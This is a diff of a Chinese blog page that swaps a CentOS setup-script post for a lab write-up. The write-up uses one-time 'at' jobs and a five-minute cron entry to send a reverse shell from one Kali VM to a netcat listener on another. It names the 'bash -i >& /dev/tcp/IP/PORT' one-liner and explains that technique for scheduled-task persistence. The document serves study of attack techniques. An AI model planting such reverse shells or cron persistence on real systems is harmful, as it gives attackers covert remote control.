@@ -71,9 +71,9 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-写一个自动化脚本，让一台新机子，完成关防火墙 关虚拟网卡 换源 selinux的操作" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-使用一次性计划 任务 和周期性计划任务反弹shell（5分钟后执行，和每5分钟执行1次），kali主机接收，解释命令字的含义。" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/08/09/%E5%86%99%E4%B8%80%E4%B8%AA%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%AE%A9%E4%B8%80%E5%8F%B0%E6%96%B0%E6%9C%BA%E5%AD%90%EF%BC%8C%E5%AE%8C%E6%88%90%E5%85%B3%E9%98%B2%E7%81%AB%E5%A2%99%20%E5%85%B3%E8%99%9A%E6%8B%9F%E7%BD%91%E5%8D%A1%20%E6%8D%A2%E6%BA%90%20selinux%E7%9A%84%E6%93%8D%E4%BD%9C/" class="article-date">
+    <a href="/2025/08/09/%E4%BD%BF%E7%94%A8%E4%B8%80%E6%AC%A1%E6%80%A7%E8%AE%A1%E5%88%92%20%E4%BB%BB%E5%8A%A1%20%E5%92%8C%E5%91%A8%E6%9C%9F%E6%80%A7%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell%EF%BC%885%E5%88%86%E9%92%9F%E5%90%8E%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%92%8C%E6%AF%8F5%E5%88%86%E9%92%9F%E6%89%A7%E8%A1%8C1%E6%AC%A1%EF%BC%89%EF%BC%8Ckali%E4%B8%BB%E6%9C%BA%E6%8E%A5%E6%94%B6%EF%BC%8C%E8%A7%A3%E9%87%8A%E5%91%BD%E4%BB%A4%E5%AD%97%E7%9A%84%E5%90%AB%E4%B9%89%E3%80%82/" class="article-date">
   <time class="dt-published" datetime="2025-08-09T03:55:11.791Z" itemprop="datePublished">2025-08-09</time>
 </a>
     
@@ -83,14 +83,94 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h2 id="写一个自动化脚本，让一台新机子，完成关防火墙-关虚拟网卡-换源-selinux的操作"><a href="#写一个自动化脚本，让一台新机子，完成关防火墙-关虚拟网卡-换源-selinux的操作" class="headerlink" title="写一个自动化脚本，让一台新机子，完成关防火墙 关虚拟网卡 换源 selinux的操作"></a>写一个自动化脚本，让一台新机子，完成关防火墙 关虚拟网卡 换源 selinux的操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">vim /root/init.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">set</span> -euo pipefail</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== 1. 关闭防火墙 ====</span></span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl <span class="built_in">disable</span> firewalld</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[✓] 防火墙已关闭并禁用&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== 2. 设置 SELinux ====</span></span><br><span class="line">setenforce 0</span><br><span class="line">sed -ri <span class="string">&#x27;s/^SELINUX=.*/SELINUX=permissive/&#x27;</span> /etc/selinux/config</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[✓] SELinux 已设为 permissive&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== 3. 关闭虚拟网卡 ====</span></span><br><span class="line">systemctl stop libvirtd.service</span><br><span class="line">systemctl <span class="built_in">disable</span> libvirtd.service</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[✓] libvirtd 已停止并禁用&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== 4. 换源 ====</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /etc/yum.repos.d/backup</span><br><span class="line"><span class="built_in">mv</span> /etc/yum.repos.d/*.repo /etc/yum.repos.d/backup/ 2&gt;/dev/null || <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt;/etc/yum.repos.d/CentOS-Base.repo &lt;&lt;<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">[base]</span><br><span class="line">name=CentOS-Base</span><br><span class="line">baseurl=https://mirrors.aliyun.com/centos-vault/8.5.2111/BaseOS/<span class="variable">$basearch</span>/os/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-centosofficial</span><br><span class="line"></span><br><span class="line">[extras]</span><br><span class="line">name=CentOS-Extras</span><br><span class="line">baseurl=https://mirrors.aliyun.com/centos-vault/8.5.2111/extras/<span class="variable">$basearch</span>/os/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-centosofficial</span><br><span class="line"></span><br><span class="line">[appstream]</span><br><span class="line">name=CentOS-AppStream</span><br><span class="line">baseurl=https://mirrors.aliyun.com/centos-vault/8.5.2111/AppStream/<span class="variable">$basearch</span>/os/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-centosofficial</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">dnf clean all &amp;&amp; dnf makecache</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[✓] 已更换为阿里云 vault 源&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== 5. 检查结果 ====</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;========== 检查结果 ==========&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[防火墙] systemctl is-active firewalld =&gt; <span class="subst">$(systemctl is-active firewalld)</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[SELinux] getenforce =&gt; <span class="subst">$(getenforce)</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[虚拟网卡] ip a | grep virbr =&gt; <span class="subst">$(ip a | grep virbr || echo &#x27;无 virbr&#x27;)</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[源] dnf repolist | head -3 =&gt;&quot;</span></span><br><span class="line">dnf repolist | <span class="built_in">head</span> -3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/root/init.sh</span><br><span class="line"><span class="built_in">chmod</span> +x /root/init.sh</span><br><span class="line">/root/init.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+        <h1 id="使用一次性计划-任务-和周期性计划任务反弹shell（5分钟后执行，和每5分钟执行1次），kali主机接收，解释命令字的含义。"><a href="#使用一次性计划-任务-和周期性计划任务反弹shell（5分钟后执行，和每5分钟执行1次），kali主机接收，解释命令字的含义。" class="headerlink" title="使用一次性计划 任务 和周期性计划任务反弹shell（5分钟后执行，和每5分钟执行1次），kali主机接收，解释命令字的含义。"></a>使用一次性计划 任务 和周期性计划任务反弹shell（5分钟后执行，和每5分钟执行1次），kali主机接收，解释命令字的含义。</h1><p>准备两台kali虚拟机，分别是</p>
+<ul>
+<li>攻击机（接受shell）：192.168.0.137</li>
+<li>靶机（发起反弹）：192.168.0.138</li>
+</ul>
+<h2 id="1️⃣一次性计划任务（五分钟后执行一次）"><a href="#1️⃣一次性计划任务（五分钟后执行一次）" class="headerlink" title="1️⃣一次性计划任务（五分钟后执行一次）"></a>1️⃣一次性计划任务（五分钟后执行一次）</h2><h3 id="1-先用一台kali攻击机监听端口"><a href="#1-先用一台kali攻击机监听端口" class="headerlink" title="1.先用一台kali攻击机监听端口"></a>1.先用一台kali攻击机监听端口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://kobea.oss-cn-beijing.aliyuncs.com/image-20250808124231747.png" alt="image-20250808124231747"></p>
+
+
+<h3 id="2-从靶机提交一次性at任务"><a href="#2-从靶机提交一次性at任务" class="headerlink" title="2.从靶机提交一次性at任务"></a>2.从靶机提交一次性at任务</h3><p><img src="https://cdn.jsdelivr.net/gh/kobe88889/img.picgo@main/img/image-20250807183030759.png" alt="image-20250807183030759"></p>
+<h3 id="3-自己随便做点什么事情摸五分钟鱼，从攻击机的nc窗口会收到交互式的Shell，实验成功！"><a href="#3-自己随便做点什么事情摸五分钟鱼，从攻击机的nc窗口会收到交互式的Shell，实验成功！" class="headerlink" title="3.自己随便做点什么事情摸五分钟鱼，从攻击机的nc窗口会收到交互式的Shell，实验成功！"></a>3.自己随便做点什么事情摸五分钟鱼，从攻击机的nc窗口会收到交互式的Shell，实验成功！</h3><p><img src="https://cdn.jsdelivr.net/gh/kobe88889/img.picgo@main/img/image-20250807183400863.png" alt="image-20250807183400863"></p>
+<h2 id="2️⃣周期性计划任务（每五分钟执行一次）"><a href="#2️⃣周期性计划任务（每五分钟执行一次）" class="headerlink" title="2️⃣周期性计划任务（每五分钟执行一次）"></a>2️⃣周期性计划任务（每五分钟执行一次）</h2><h3 id="1-攻击机开启一个监听"><a href="#1-攻击机开启一个监听" class="headerlink" title="1.攻击机开启一个监听"></a>1.攻击机开启一个监听</h3><p><img src="https://cdn.jsdelivr.net/gh/kobe88889/img.picgo@main/img/image-20250807183606411.png" alt="image-20250807183606411"></p>
+<h3 id="2-靶机创建反弹脚本"><a href="#2-靶机创建反弹脚本" class="headerlink" title="2.靶机创建反弹脚本"></a>2.靶机创建反弹脚本</h3><p><img src="https://cdn.jsdelivr.net/gh/kobe88889/img.picgo@main/img/image-20250807185914108.png" alt="image-20250807185914108"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/kobe88889/img.picgo@main/img/image-20250807185931028.png" alt="image-20250807185931028"></p>
+<h3 id="3-写入crontab"><a href="#3-写入crontab" class="headerlink" title="3.写入crontab"></a>3.写入crontab</h3><h3 id="（在里面加了-5-usr-local-bin-rev-sh）"><a href="#（在里面加了-5-usr-local-bin-rev-sh）" class="headerlink" title="（在里面加了*&#x2F;5 * * * * &#x2F;usr&#x2F;local&#x2F;bin&#x2F;rev.sh）"></a>（在里面加了*&#x2F;5 * * * * &#x2F;usr&#x2F;local&#x2F;bin&#x2F;rev.sh）</h3><p><img src="https://cdn.jsdelivr.net/gh/kobe88889/img.picgo@main/img/image-20250807190011402.png" alt="image-20250807190011402"></p>
+<h3 id="4-再次摸鱼五分钟，每过五分钟从攻击机的nc窗口会收到交互式的Shell，实验成功！"><a href="#4-再次摸鱼五分钟，每过五分钟从攻击机的nc窗口会收到交互式的Shell，实验成功！" class="headerlink" title="4.再次摸鱼五分钟，每过五分钟从攻击机的nc窗口会收到交互式的Shell，实验成功！"></a>4.再次摸鱼五分钟，每过五分钟从攻击机的nc窗口会收到交互式的Shell，实验成功！</h3><p><img src="https://cdn.jsdelivr.net/gh/kobe88889/img.picgo@main/img/image-20250807190403643.png" alt="image-20250807190403643"></p>
+<p>清除这两项任务：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/kobe88889/img.picgo@main/img/image-20250807190829975.png" alt="image-20250807190829975"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/kobe88889/img.picgo@main/img/image-20250807190837685.png" alt="image-20250807190837685"></p>
+<h2 id="3️⃣对于用到的命令字的含义作解释"><a href="#3️⃣对于用到的命令字的含义作解释" class="headerlink" title="3️⃣对于用到的命令字的含义作解释"></a>3️⃣对于用到的命令字的含义作解释</h2><table>
+<thead>
+<tr>
+<th align="center">命令、符号</th>
+<th align="center">场景</th>
+<th align="center">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">at</td>
+<td align="center">一次性计划任务</td>
+<td align="center">at 指定时间” 把后面的命令交给 <strong>atd 守护进程</strong>，到点执行一次就结束。</td>
+</tr>
+<tr>
+<td align="center">atq</td>
+<td align="center">查看任务</td>
+<td align="center">at queue 的缩写，列出当前用户的所有待执行 at 任务及其编号。</td>
+</tr>
+<tr>
+<td align="center">atrm&lt;编号&gt;</td>
+<td align="center">删除任务</td>
+<td align="center"><strong>at remove</strong> 的缩写，根据编号把任务从队列里删除。</td>
+</tr>
+<tr>
+<td align="center">crontab -e</td>
+<td align="center">编辑周期性任务</td>
+<td align="center">调用默认编辑器打开 <strong>当前用户</strong> 的 crontab 文件；root 用户加 <code>sudo</code> 就是改 root 的计划任务。</td>
+</tr>
+<tr>
+<td align="center">crontab -r</td>
+<td align="center">清空周期性任务</td>
+<td align="center"><strong>remove</strong>，直接删掉整个 crontab 表，不再执行任何周期性命令。</td>
+</tr>
+<tr>
+<td align="center">*&#x2F;5 * * * *</td>
+<td align="center">crontab时间格式</td>
+<td align="center">每 5 分钟执行一次； <code>               * 代表“每”，</code>&#x2F;&#96; 表示步长。</td>
+</tr>
+<tr>
+<td align="center">nc -lvmp &lt;端口&gt;</td>
+<td align="center">开启端口监听</td>
+<td align="center"><strong>netcat 监听</strong> 模式，<code>-l</code> 监听、 <code>-v</code> 详细输出、<code>-n</code> 不做 DNS 解析、<code>-p</code> 指定端口，用来等靶机连接。</td>
+</tr>
+<tr>
+<td align="center">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;PORT 0&gt;&amp;1</td>
+<td align="center">反弹Shell核心</td>
+<td align="center">把 bash 的 <strong>标准输入&#x2F;输出&#x2F;错误</strong> 全部重定向到 TCP socket，实现远程交互式 Shell。</td>
+</tr>
+<tr>
+<td align="center">tee</td>
+<td align="center">写文件</td>
+<td align="center">把标准输入同时 <strong>输出到屏幕和文件</strong>，常用于需要 sudo 权限时一次性生成脚本。</td>
+</tr>
+<tr>
+<td align="center">&lt;&lt;’EOF’</td>
+<td align="center">heredoc定界符</td>
+<td align="center">把多行文本一次性喂给前面命令，直到独占一行的 <code>EOF</code> 为止。</td>
+</tr>
+<tr>
+<td align="center">chmod +x</td>
+<td align="center">赋可执行权限</td>
+<td align="center">让文件变成可执行脚本，crontab 或手动调用时无需再 <code>bash script.sh</code>。</td>
+</tr>
+</tbody></table>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/08/09/%E5%86%99%E4%B8%80%E4%B8%AA%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%AE%A9%E4%B8%80%E5%8F%B0%E6%96%B0%E6%9C%BA%E5%AD%90%EF%BC%8C%E5%AE%8C%E6%88%90%E5%85%B3%E9%98%B2%E7%81%AB%E5%A2%99%20%E5%85%B3%E8%99%9A%E6%8B%9F%E7%BD%91%E5%8D%A1%20%E6%8D%A2%E6%BA%90%20selinux%E7%9A%84%E6%93%8D%E4%BD%9C/" data-id="cmfbvjmbs000a6w0fhwkbczup" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/08/09/%E4%BD%BF%E7%94%A8%E4%B8%80%E6%AC%A1%E6%80%A7%E8%AE%A1%E5%88%92%20%E4%BB%BB%E5%8A%A1%20%E5%92%8C%E5%91%A8%E6%9C%9F%E6%80%A7%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell%EF%BC%885%E5%88%86%E9%92%9F%E5%90%8E%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%92%8C%E6%AF%8F5%E5%88%86%E9%92%9F%E6%89%A7%E8%A1%8C1%E6%AC%A1%EF%BC%89%EF%BC%8Ckali%E4%B8%BB%E6%9C%BA%E6%8E%A5%E6%94%B6%EF%BC%8C%E8%A7%A3%E9%87%8A%E5%91%BD%E4%BB%A4%E5%AD%97%E7%9A%84%E5%90%AB%E4%B9%89%E3%80%82/" data-id="cmfbwctqx000ab80ff44temce" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -142,7 +222,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/08/09/%E6%8C%89%E7%85%A7%E6%8B%93%E6%89%91%E5%AE%8C%E6%88%90%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E9%85%8D%E7%BD%AE%E4%BB%BB%E5%8A%A1/" data-id="cmfbvjmbt000b6w0f78t9em2y" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/08/09/%E6%8C%89%E7%85%A7%E6%8B%93%E6%89%91%E5%AE%8C%E6%88%90%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E9%85%8D%E7%BD%AE%E4%BB%BB%E5%8A%A1/" data-id="cmfbwctqx000bb80f6xjnckb6" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
